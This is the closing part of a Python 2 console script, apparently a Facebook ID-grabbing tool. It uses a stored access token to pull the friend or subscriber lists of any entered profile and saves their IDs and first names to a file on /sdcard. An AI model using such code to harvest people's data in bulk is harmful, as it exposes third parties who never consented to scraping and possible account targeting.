        print ''
        print '\tInvalid id provided'
        print ''
        raw_input(' Press Enter To Back')
        menu()

    r = requests.get('https://graph.facebook.com/' + idh + '/subscribers?limit=' + limit + '&access_token=' + token, headers=header)
    q = json.loads(r.text)
    ids = open('ids_friends.txt', 'w')
    for i in q['data']:
        uid = i['id']
        na = i['name']
        nm = na.rsplit(' ')[0]
        idg.append(uid + '|' + nm)
        ids.write(uid + '|' + nm + '\n')

    ids.close()
    print ''
    print 47 * '-'
    print '\x1b[1;92m The Process Has Completed'
    print '\x1b[1;93m Total ids: \x1b[1;92m' + str(len(idg))
    print 47 * '-'
    print ''
    raw_input('\x1b[1;95m Press enter to download file')
    os.system('cat ids_friends.txt | grep "1" > /sdcard/followids.txt')
    os.system('rm -rf ids_friends.txt')
    print '\x1b[1;93m File downloaded successfully'
    print '\x1b[1;92m Saved /sdcard/followids.txt'
    time.sleep(1)
    menu()


def ex_id():
    global token
    idg = []
    try:
        token = open('access_token.txt', 'r').read()
    except IOError:
        print '\tToken not found'
        print ''
        time.sleep(1)
        login_choice()

    os.system('clear')
    print logo
    print ''
    print '\tCreating File Just Wait A Minute'
    print ''
    idh = raw_input(' Enter Id: ')
    try:
        r = requests.get('https://graph.facebook.com/' + idh + '?access_token=' + token, headers=header)
        q = json.loads(r.text)
        print ' Collecting from: ' + q['name']
    except KeyError:
        print ''
        print '\tInvalid id provided'
        print ''
        raw_input(' Press enter to back')
        menu()

    r = requests.get('https://graph.facebook.com/' + idh + '/friends?access_token=' + token, headers=header)
    q = json.loads(r.text)
    ids = open('ids_friends.txt', 'w')
    for i in q['data']:
        uid = i['id']
        na = i['name']
        nm = na.rsplit(' ')[0]
        idg.append(uid + '|' + nm)
        ids.write(uid + '|' + nm + '\n')

    ids.close()
    print ''
    print 47 * '-'
    print ''
    print ' The process has completed'
    print ' Total ids: ' + str(len(idg))
    print ''
    print 47 * '-'
    print ''
    raw_input(' Press enter to download file')
    os.system('cp ids_friends.txt /sdcard')
    os.system('rm -rf ids_friends.txt')
    print ' File downloaded successfully\xf0\x9f\x91\x89ids_friends.txt'
    time.sleep(1)
    ex_id()

if __name__ == '__main__':
	main()
